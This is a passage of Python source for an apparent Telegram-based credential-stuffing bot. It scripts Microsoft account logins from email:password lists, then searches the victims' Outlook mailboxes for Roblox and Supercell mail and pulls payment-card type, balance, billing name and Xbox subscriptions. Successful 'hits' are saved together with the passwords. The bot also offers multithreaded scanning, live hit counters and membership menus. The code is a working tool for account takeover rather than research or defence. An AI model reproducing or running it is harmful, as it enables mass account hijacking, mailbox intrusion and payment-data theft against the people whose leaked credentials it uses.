                headers={"Host":"login.live.com","User-Agent":"Mozilla/5.0"}
                r=self.session.get(payment_auth_url,headers=headers,allow_redirects=True,timeout=self.timeout)
                payment_token=None
                for pattern in [r'access_token=([^&\s"\']+)',r'"access_token":"([^"]+)"']:
                    match=re.search(pattern,r.text+r.url)
                    if match:payment_token=unquote(match.group(1));break
                if not payment_token:time.sleep(0.5);continue
                pay_headers={"User-Agent":"Mozilla/5.0","Accept":"application/json","Authorization":f'MSADELEGATE1.0="{payment_token}"',"Content-Type":"application/json"}
                try:
                    r_inst=self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx",headers=pay_headers,timeout=self.timeout)
                    if r_inst.status_code==200:
                        b_match=re.search(r'"balance"\s*:\s*([0-9.]+)',r_inst.text)
                        if b_match:balance=f"${b_match.group(1)}"
                        c_match=re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"',r_inst.text,re.DOTALL)
                        if c_match:card_type=c_match.group(1).title()
                        name_match=re.search(r'"accountHolderName"\s*:\s*"([^"]+)"',r_inst.text,re.IGNORECASE)
                        if name_match:billing_name=name_match.group(1)
                        country_match=re.search(r'"country"\s*:\s*"([^"]{2,3})"',r_inst.text,re.IGNORECASE)
                        if country_match:billing_country=country_match.group(1).upper()
                except Exception:pass
                r_sub=self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",headers=pay_headers,timeout=self.timeout)
                if r_sub.status_code==200:
                    blocks=r_sub.text.split('},{');seen_titles=set()
                    for block in blocks:
                        is_gaming_sub,matched_kw=False,""
                        for keyword in TARGET_SUBSCRIPTIONS:
                            if keyword.lower() in block.lower():is_gaming_sub,matched_kw=True,keyword;break
                        if is_gaming_sub:
                            title_match=re.search(r'"title"\s*:\s*"([^"]+)"',block)
                            date_match=re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)',block)
                            auto_match=re.search(r'"autoRenew"\s*:\s*(true|false)',block)
                            title=title_match.group(1) if title_match else matched_kw
                            ren_date=date_match.group(1) if date_match else "Unknown"
                            auto_rn="Yes" if (auto_match and auto_match.group(1)=="true") else "No"
                            double_check=any(k.lower() in title.lower() for k in TARGET_SUBSCRIPTIONS)
                            if ren_date!="Unknown" and double_check:
                                days=self.get_days_left(ren_date+"T00:00:00Z")
                                if days>0 and title not in seen_titles:
                                    seen_titles.add(title);sub_details.append({"title":title,"days":days,"expire":ren_date,"auto":auto_rn})
                    if sub_details:return sub_details,balance,card_type,billing_name,billing_country
                    else:return None,balance,card_type,billing_name,billing_country
                else:time.sleep(0.5);continue
            except Exception:time.sleep(0.5);continue
        return None,balance,card_type,billing_name,billing_country
    def check_account(self,email,password):
        try:
            url1=f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1={"X-OneAuth-AppName":"Outlook Lite","User-Agent":"Dalvik/2.1.0"}
            r1=self.session.get(url1,headers=headers1,timeout=self.timeout)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "MSAccount" not in r1.text:return "BAD",[]
            url2=f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2=self.session.get(url2,allow_redirects=True,timeout=self.timeout)
            url_match=re.search(r'urlPost":"([^"]+)"',r2.text)
            ppft_match=re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',r2.text)
            if not url_match or not ppft_match:return "BAD",[]
            post_url=url_match.group(1).replace("\\/","/");ppft=ppft_match.group(1)
            login_data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"}
            r3=self.session.post(post_url,data=login_data,headers=headers3,allow_redirects=False,timeout=self.timeout)
            resp=r3.text.lower()
            if "account or password is incorrect" in resp or r3.text.count("error")>0:return "BAD",[]
            if any(x in resp for x in ["identity/confirm","consent","proofaction","recover","updatepassword","cancel?mkt"]):return "2FA",[]
            if "abuse" in resp:return "BAD",[]
            location=r3.headers.get("Location","")
            code_match=re.search(r'code=([^&]+)',location)
            if not code_match:return "BAD",[]
            code=code_match.group(1);mspcid=self.session.cookies.get("MSPCID","");cid=mspcid.upper() if mspcid else ""
            token_data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4=self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",data=token_data,headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=self.timeout)
            access_token=r4.json().get("access_token","") if r4.status_code==200 else ""
            prof_name,prof_country=self.parse_profile(access_token,cid) if access_token and cid else ("","")
            subs,balance,card,bill_name,bill_country=self.check_billing()
            final_name,final_country=self.extract_smart_data(email,prof_name if prof_name else bill_name,prof_country if prof_country else bill_country)
            if subs:return "PREMIUM",[f"{email}:{password} | Name: {final_name} | Country: {final_country} | Subscription: {sub['title']} | Renewal: {sub['auto']} | Remaining Days: {sub['days']} | Expire: {sub['expire']} | Card: {card} | Balance: {balance} | By: {BOT_USERNAME}" for sub in subs]
            else:return "FREE",[]
        except requests.exceptions.Timeout:return "ERROR",[]
        except Exception:return "ERROR",[]

class RobloxChecker:
    def __init__(self):self.session=requests.Session();self.timeout=(10,15)
    def get_user_id(self,username):
        try:
            r=self.session.post("https://users.roblox.com/v1/usernames/users",json={"usernames":[username],"excludeBannedUsers":False},timeout=self.timeout)
            if r.status_code==200 and r.json().get("data"):return r.json()["data"][0]["id"]
        except Exception:pass
        return None
    def get_roblox_profile(self,username):
        res={"username":username,"friends":0,"banned":"No","created":"Unknown","profile":""}
        user_id=self.get_user_id(username)
        if not user_id:return res
        try:
            user_data=self.session.get(f"https://users.roblox.com/v1/users/{user_id}",timeout=self.timeout).json()
            res["banned"]="Yes" if user_data.get("isBanned") else "No"
            created_raw=user_data.get("created","")
            res["created"]=created_raw.split("T")[0] if created_raw else "Unknown"
            res["friends"]=self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count",timeout=self.timeout).json().get("count",0)
            res["profile"]=f"https://www.roblox.com/users/{user_id}/profile"
        except Exception:pass
        return res
    def extract_roblox_username(self,text):
        for pattern in [r'account:\s*([a-zA-Z0-9_]+)',r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',r'account:\s*([a-zA-Z0-9_]+)\.',r'for\s+([a-zA-Z0-9_]+)\.\s+If',r'Hi\s+([a-zA-Z0-9_]+),',r'Hello\s+([a-zA-Z0-9_]+),',r'Username:\s*([a-zA-Z0-9_]+)']:
            match=re.search(pattern,text,re.IGNORECASE)
            if match:return match.group(1)
        return None
    def check_account(self,email,password):
        try:
            r1=self.session.get("https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress="+email,headers={"X-OneAuth-AppName":"Outlook Lite","X-Office-Version":"3.11.0-minApi24","X-CorrelationId":str(uuid.uuid4()),"User-Agent":"Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)","Host":"odc.officeapps.live.com","Connection":"Keep-Alive"},timeout=self.timeout)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text:return "BAD",[]
            r2=self.session.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+email+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Connection":"keep-alive"},allow_redirects=True,timeout=self.timeout)
            url_match,ppft_match=re.search(r'urlPost":"([^"]+)"',r2.text),re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',r2.text)
            if not url_match or not ppft_match:return "BAD",[]
            r3=self.session.post(url_match.group(1).replace("\\/","/"),data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_match.group(1)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960",headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Origin":"https://login.live.com","Referer":r2.url},allow_redirects=False,timeout=self.timeout)
            if "account or password is incorrect" in r3.text or r3.text.count("error")>0 or "https://account.live.com/identity/confirm" in r3.text or "Abuse" in r3.text:return "BAD",[]
            code_match,mspcid=re.search(r'code=([^&]+)',r3.headers.get("Location","")),self.session.cookies.get("MSPCID","")
            if not code_match or not mspcid:return "BAD",[]
            r4=self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code_match.group(1)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=self.timeout)
            if "access_token" not in r4.text:return "BAD",[]
            r_search=self.session.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",json={"Cvid":str(uuid.uuid4()),"Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Query":{"QueryString":"no-reply@roblox.com"},"Size":50,"Sort":[{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":True,"TopResultsCount":3}],"QueryAlterationOptions":{"EnableSuggestion":True,"EnableAlteration":True,"SupportedRecourseDisplayTypes":["Suggestion"]},"LogicalId":str(uuid.uuid4())},headers={"User-Agent":"Outlook-Android/2.0","Accept":"application/json","Authorization":f"Bearer {r4.json()['access_token']}","X-AnchorMailbox":f"CID:{mspcid.upper()}","Host":"substrate.office.com","Content-Type":"application/json"},timeout=self.timeout)
            if r_search.status_code==200:
                total_match=re.search(r'"Total":(\d+)',r_search.text)
                total_roblox=int(total_match.group(1)) if total_match else 0
                if total_roblox>0:
                    roblox_user=self.extract_roblox_username(r_search.text)
                    if roblox_user:
                        p=self.get_roblox_profile(roblox_user)
                        return "PREMIUM",[f"{email}:{password} | Total Roblox: {total_roblox} | Username: {p.get('username','Unknown')} | Friends: {p.get('friends',0)} | Banned: {p.get('banned','No')} | Created: {p.get('created','Unknown')} | Profile: {p.get('profile','')} | By: {BOT_USERNAME}"]
                return "FREE",[]
            return "ERROR",[]
        except Exception:return "ERROR",[]

class SupercellChecker:
    def __init__(self):self.session=requests.Session();self.uuid=str(uuid.uuid4());self.timeout=15
    def check_supercell_games(self,access_token,cid):
        try:
            r=self.session.post("https://outlook.live.com/searchservice/api/v2/query?n=88",headers={"Authorization":f"Bearer {access_token}","X-AnchorMailbox":f"CID:{cid}","Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},json={"Cvid":str(uuid.uuid4()),"Scenario":{"Name":"owa.react"},"TimeZone":"Pacific Standard Time","EntityRequests":[{"EntityType":"Message","ContentSources":["Exchange"],"Query":{"QueryString":"supercell"},"Size":100,"EnableTopResults":False}]},timeout=self.timeout)
            if r.status_code==200:
                text_data=r.text.lower();found_games=[]
                total_supercell=text_data.count("internetmessageid")
                if total_supercell==0 and "noreply@id.supercell.com" in text_data:
                    total_supercell=text_data.count("noreply@id.supercell.com")
                if "supercell" in text_data and ("noreply@id.supercell.com" in text_data or total_supercell>0):
                    kws={"clash royale":"Clash Royale","clash royal":"Clash Royale","brawl stars":"Brawl Stars","clash of clans":"Clash of Clans","hay day":"Hay Day","boom beach":"Boom Beach","squad busters":"Squad Busters"}
                    for kw,name in kws.items():
                        if kw in text_data:found_games.append(name)
                    found_games=list(set(found_games))
                    if found_games:return {"status":"HIT","games":found_games,"total_supercell":total_supercell}
                    return {"status":"NO_LINKED","games":[]}
                return {"status":"NO_LINKED","games":[]}
            return {"status":"ERROR","games":[]}
        except Exception:return {"status":"ERROR","games":[]}
    def login(self,email,password):
        try:
            r1=self.session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",headers={"X-OneAuth-AppName":"Outlook Lite","X-Office-Version":"3.11.0-minApi24","X-CorrelationId":self.uuid,"User-Agent":"Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"},timeout=self.timeout)
            if any(x in r1.text for x in ["Neither","Placeholder","OrgId"]) or "MSAccount" not in r1.text:return {"status":"BAD"}
            r2=self.session.get(f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},allow_redirects=True,timeout=self.timeout)
            url_match,ppft_match=re.search(r'urlPost":"([^"]+)"',r2.text),re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',r2.text)
            if not url_match or not ppft_match:return {"status":"BAD"}
            r3=self.session.post(url_match.group(1).replace("\\/","/"),data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_match.group(1)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960",headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Origin":"https://login.live.com","Referer":r2.url},allow_redirects=False,timeout=self.timeout)
            if "account or password is incorrect" in r3.text or r3.text.count("error")>0 or "https://account.live.com/identity/confirm" in r3.text or "https://account.live.com/Abuse" in r3.text:return {"status":"BAD"}
            loc=r3.headers.get("Location","")
            if not loc:return {"status":"BAD"}
            code_match,mspcid=re.search(r'code=([^&]+)',loc),self.session.cookies.get("MSPCID","")
            if not code_match or not mspcid:return {"status":"BAD"}
            r4=self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code_match.group(1)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=self.timeout)
            if "access_token" not in r4.text:return {"status":"BAD"}
            return self.check_supercell_games(r4.json()["access_token"],mspcid.upper())
        except Exception:return {"status":"ERROR"}
    def check_account(self,email,password):
        for _ in range(3):
            res=self.login(email,password)
            if res["status"]!="ERROR":break
            time.sleep(1.5)
        st=res.get("status","ERROR")
        if st=="HIT":
            games=res.get("games",[]);total_supercell=res.get("total_supercell",0);games_str=", ".join(games)
            return "PREMIUM",[f"{email}:{password} | Total Supercell = {total_supercell} | Games = [ {games_str} ]"]
        elif st=="NO_LINKED":return "FREE",[]
        elif st=="BAD":return "BAD",[]
        else:return "ERROR",[]

def get_mode_filename(mode,file_type):
    if file_type=="hits":
        if mode==ScannerMode.ROBLOX.value:return "Roblox-Hits.txt"
        elif mode==ScannerMode.SUPERCELL.value:return "Supercell-Hits.txt"
        else:return "XBOX-GamePass.txt"
    return f"{BOT_USERNAME}_Free.txt"

def get_all_in_one_stats_text(job):
    mins,secs=divmod(int(time.time()-job.start_time) if job.start_time else 0,60)
    status_text = 'Scan Paused ⏸ (Auto-resume in 30s)' if job.status=='Paused' else f'Scan {job.status} ✅' if job.status in ['Stopped','Completed'] else 'Scan In Progress 🔄'
    return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> <code>{job.scanner_mode}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>Supercell:</b> <code>{job.supercell_hits}</code>\n✅ <b>Netflix:</b> <code>{job.netflix_hits}</code>\n✅ <b>XBOX:</b> <code>{job.xbox_hits}</code>\n✅ <b>Roblox:</b> <code>{job.roblox_hits}</code>\n✅ <b>H0TM4IL:</b> <code>{job.hotmail_hits}</code>\n🔐 <b>2FA:</b> <code>{job.twofa}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def get_xbox_fetcher_stats_text(job):
    mins,secs=divmod(int(time.time()-job.start_time) if job.start_time else 0,60)
    status_text = 'Scan Paused ⏸ (Auto-resume in 30s)' if job.status=='Paused' else f'Scan {job.status} ✅' if job.status in ['Stopped','Completed'] else 'Scan In Progress 🔄'
    return f"""𖠵 📊 {status_text} 𖥻
━━━━━━━━━━━━━━━━━━━━━━━━━━━
➪ 📁 File: {trunc_name(job.file_name)}
➪ 📊 Processed: {job.checked}/{job.total}
➪ 🔍 Codes Pulled: {job.codes_pulled}
➪ 🧵 Threads: {job.max_workers}
➪ 📡 Mode: 💎 Xbox Code Fetcher
━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Valid Codes: {job.valid}
❌ Invalid Codes: {job.invalid}
🌎 Region Locked: {job.region_locked_count}
♻️ Redeemed: {job.redeemed}
⏰ Expired: {job.expired}
⚠️ Rate Limited: {job.rate_limited}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Elapsed: {f'{secs} sec' if mins==0 else f'{mins} min'}
⚡ CPM: {job.cpm}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
☰ — Controls:
︙ /pause - Pause
︙ /resume - Resume
︙ /stop - Stop and send results
━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def get_main_markup(message):
    m=InlineKeyboardMarkup(row_width=2);m.add(InlineKeyboardButton("📊 My Stats",callback_data="my_stats",style="primary"),InlineKeyboardButton("🔗 My Referrals",callback_data="referral_sys",style="primary"),InlineKeyboardButton("🎁 Rewards & Gifts",callback_data="rewards_menu",style="primary"),InlineKeyboardButton("💎 Membership",callback_data="membership_plans",style="primary"),InlineKeyboardButton("📞 Support",callback_data="support_contact",style="primary"),InlineKeyboardButton("⚙️ Settings",callback_data="user_settings",style="primary"))
    if str(message.chat.id)=="8744777152":m.add(InlineKeyboardButton("👑 Owner Panel",callback_data="owner_panel",style="danger"))
    return m

def get_stats_text(job):
    mins,secs=divmod(int(time.time()-job.start_time) if job.start_time else 0,60)
    status_text = 'Scan Paused ⏸ (Auto-resume in 30s)' if job.status=='Paused' else f'Scan {job.status} ✅' if job.status in ['Stopped','Completed'] else 'Scan In Progress 🔄'
    if job.scanner_mode == ScannerMode.SPEED.value:
        return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> 🚀 Speed Mode\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>HITS:</b> <code>{job.hits}</code>\n🔐 <b>2FA:</b> <code>{job.twofa}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    elif job.scanner_mode == ScannerMode.NETFLIX.value:
        return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> <code>{job.scanner_mode}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>HITS:</b> <code>{job.hits}</code>\n🆓 <b>Valid:</b> <code>{job.valid}</code>\n🟦 <b>Email Chg:</b> <code>{job.email_changed}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    elif job.scanner_mode == ScannerMode.PSN_V2.value:
        return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> 🎮 PSN V2\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>HITS:</b> <code>{job.hits}</code>\n🆓 <b>NO LINKED:</b> <code>{job.free}</code>\n🔐 <b>2FA:</b> <code>{job.twofa}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    elif job.scanner_mode == ScannerMode.SUPERCELL.value:
        return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> <code>🎮 Supercell</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>HITS:</b> <code>{job.hits}</code>\n🆓 <b>NO LINKED:</b> <code>{job.free}</code>\n🔐 <b>2FA:</b> <code>{job.twofa}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    return f"𖠵 <b>📊 {status_text}</b> 𖥻\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n➪ <b>📁 File:</b> <code>{trunc_name(job.file_name)}</code>\n➪ <b>📊 Processed:</b> <code>{job.checked}/{job.total}</code>\n➪ <b>🧵 Threads:</b> <code>{job.max_workers}</code>\n➪ <b>📡 Mode:</b> <code>{job.scanner_mode}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>HITS:</b> <code>{job.hits}</code>\n🆓 <b>FREE:</b> <code>{job.free}</code>\n🔐 <b>2FA:</b> <code>{job.twofa}</code>\n❌ <b>BAD:</b> <code>{job.bad}</code>\n⚠️ <b>ERROR:</b> <code>{job.error}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ <b>Elapsed:</b> <code>{f'{mins} min' if mins>0 else f'{secs} sec'}</code>\n⚡ <b>CPM:</b> <code>{job.cpm}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n☰ <b>— Controls:</b>\n︙ /pause - Pause\n︙ /resume - Resume\n︙ /stop - Stop and send results\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def get_job_markup(job):
    m=InlineKeyboardMarkup()
    if job.status=='Running':m.row(InlineKeyboardButton("⏸ Pause",callback_data=f"job_pause_{job.job_id}",style="danger"))
    elif job.status=='Paused':m.row(InlineKeyboardButton("▶️ Resume",callback_data=f"job_resume_{job.job_id}",style="success"))
    if job.status in ['Running','Paused']:m.row(InlineKeyboardButton("⏹ Stop",callback_data=f"job_stop_{job.job_id}",style="danger"))
    return m

def auto_resume_job(job):
    time.sleep(30)
    if job.status=='Paused':
        job.status,job.pause_start_time='Running',None;job.pause_event.set()
        try:
            if job.scanner_mode==ScannerMode.ALL_IN_ONE.value: cur_txt = get_all_in_one_stats_text(job)
            elif job.scanner_mode==ScannerMode.XBOX_CODE_FETCHER.value: cur_txt = get_xbox_fetcher_stats_text(job)
            else: cur_txt = get_stats_text(job)
            send_with_retry(bot.edit_message_text,cur_txt,job.chat_id,job.msg_id,reply_markup=get_job_markup(job))
            send_with_retry(bot.send_message,job.chat_id,"▶️ <b>Scan Auto-Resumed</b>\n\n30 seconds have passed, scanning continues...")
        except Exception:pass

def update_ui_thread(job):
    last_text=""
    while job.status in ['Running','Paused']:
        try:
            if job.scanner_mode==ScannerMode.ALL_IN_ONE.value: cur = get_all_in_one_stats_text(job)
            elif job.scanner_mode==ScannerMode.XBOX_CODE_FETCHER.value: cur = get_xbox_fetcher_stats_text(job)
            else: cur = get_stats_text(job)
            if cur!=last_text:send_with_retry(bot.edit_message_text,cur,job.chat_id,job.msg_id,reply_markup=get_job_markup(job));last_text=cur
        except Exception:pass
        time.sleep(4)

def pin_scan_message(chat_id,message_id):
    try:send_with_retry(bot.pin_chat_message,chat_id,message_id,disable_notification=True)
    except Exception:pass

def unpin_scan_message(chat_id,message_id):
    try:send_with_retry(bot.unpin_chat_message,chat_id,message_id)
    except Exception:pass

def process_single_account_all_in_one(email,password):
    r={"xbox":{"status":"ERROR","data":[]},"roblox":{"status":"ERROR","data":[]},"hotmail":{"status":"ERROR","data":[]},"supercell":{"status":"ERROR","data":[]},"netflix":{"status":"ERROR","data":[]}}
    try:r["netflix"]["status"],r["netflix"]["data"]=NetflixChecker().check_account(email,password)
    except Exception:pass
    try:r["xbox"]["status"],r["xbox"]["data"]=XboxTitanChecker().check_account(email,password)
    except Exception:pass
    try:r["roblox"]["status"],r["roblox"]["data"]=RobloxChecker().check_account(email,password)
    except Exception:pass
    try:r["hotmail"]["status"],r["hotmail"]["data"]=SpeedModeChecker().check_account(email,password)
    except Exception:pass
    try:r["supercell"]["status"],r["supercell"]["data"]=SupercellChecker().check_account(email,password)
    except Exception:pass
    return r

def get_balanced_thread_count(chat_id, total_threads):
    try:
        with jobs_lock:
            active_user_jobs=sum(1 for j in current_jobs if j.chat_id==str(chat_id) and j.status in ['Running','Paused'])
